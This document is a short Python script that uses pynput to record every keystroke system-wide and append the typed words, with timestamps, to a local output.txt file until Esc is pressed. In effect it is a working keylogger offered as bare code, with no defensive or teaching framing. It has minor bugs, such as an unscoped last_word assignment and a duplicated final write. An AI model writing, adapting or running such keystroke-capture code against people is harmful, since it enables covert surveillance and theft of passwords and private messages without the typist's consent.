from pynput import keyboard
from datetime import datetime

current_keys = []
last_word = ""

def on_press(key):
    global current_keys, last_word
    try:
        current_keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            output = ''.join(current_keys)
            current_keys = []
            write_output(output)
            last_word = output

def on_release(key):
    if key == keyboard.Key.esc:
        if current_keys:
            output = ''.join(current_keys)
            write_output(output)
            last_word = output
        # Stop listener
        return False

def write_output(output):
    now = datetime.now()
    timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
    formatted_output = f"{timestamp} - {output}"
    print(formatted_output)
    with open("output.txt", 'a') as file:
        file.write('\n' + "#" * 20 + f"\n{timestamp}\n" + "#" * 20 + '\n')
        file.write(formatted_output + '\n')

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# Record the last word at the end
if last_word:
    now = datetime.now()
    timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
    formatted_output = f"{timestamp} - {last_word}"
    print(formatted_output)
    with open("output.txt", 'a') as file:
        file.write('\n' + "#" * 20 + f"\n{timestamp}\n" + "#" * 20 + '\n')
        file.write(formatted_output + '\n')
